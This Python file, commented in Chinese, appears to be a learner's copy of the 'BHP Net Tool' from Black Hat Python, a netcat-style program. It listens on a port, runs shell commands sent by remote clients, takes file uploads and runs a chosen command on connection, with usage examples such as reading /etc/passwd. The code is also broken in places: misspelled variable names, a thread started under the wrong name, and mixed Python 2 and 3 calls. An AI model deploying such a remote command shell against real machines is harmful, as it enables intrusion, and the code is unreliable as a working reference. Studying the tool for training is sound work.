import sys
import socket
import getopt
import threading
import subprocess

#定义一些全局变量
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming cennections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection ")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a file and write to [destinction]")
    print()
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHIJK' | ./bhpnet.py -t 192.168.0.1 -p 8888")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destincation
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen"
                                ,"execute","tarhet", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destinction = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandle Option"
    #判断我们是在监听还是仅仅从标准输入发送数据
    #listen为False，len(target)大于0，port > 0 三个条件同时成立，则证明：
    #是从标准输入读取数据，即：从标准输入读取数据，发送到监听端（服务端）。
    #这里的标准输入可以来自键盘输入，亦可以来自文件重定向。
    if not listen and len(target) and port > 0:
        #从命令行(标准输入)读取数据
        #这里将阻塞，所以在不想向标准输入发送数据时：要发送CTRL-D
        buffer = sys.stdin.read()

        # 将标准输入的数据发送到监听端
        client_sender(buffer)

    #如果上面的if语句没被执行，那么就说明这个程序是作为监听端了。
    #我们开始监听并准备上传文件，执行命令
    #放置一个反弹shell
    #具体操作取决于你用的命令行选项
    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #连接到目标主机
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)
        while(True):
            #现在等待数据回传
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print(response,)

            #等待更多输入
            buffer = raw_input("")
            buffer += "\n"

            #发送出去
            client.send(buffer)
    except:
        print("[*] Exception! Exiting")
    client.close()

def server_loop():
    global target

    #如果没有定义目标，则监控所有端口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while(True):
        client_socket, addr = server.accept()

        #分拆一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler, args = (client_socket,))
        client.start()

def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Falied to execute command.\r\n"

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        #读取所有的字符并写入目标
        # （目标是一个文件，文件名跟在-u后面，这个操作就是将客户端传过来的数据写进文件里）
        file_buffer = ""

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        #现在将接受到的数据file_buffer写进文件里
        try:
            file_descriptor = open(upload_destinction, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #向另一端（即客户端）发送确认报文，确认文件已成功接收
            client_socket.send("Successful saved file to %s\r\n" % upload_destinction)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destinction)

        #检查命令执行
        if len(execute):
            output = run_command(execute)
            client_socket.send(output)

        #如果需要一个命令行shell，那么我们进入另一个循环
        if command:
            while True:
                #跳出一个窗口
                client_socket.send("<BHP: #> ")

                #现在我们接受文件直至发现换行符（即当你输入完命令后会按回车）
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)

                #执行命令，并且将命令的输出结果保存在response里
                response = run_command(cmd_buffer)

                # 返回相应数据
                client_socket.send(response)





if __name__ == "__main__":
    main()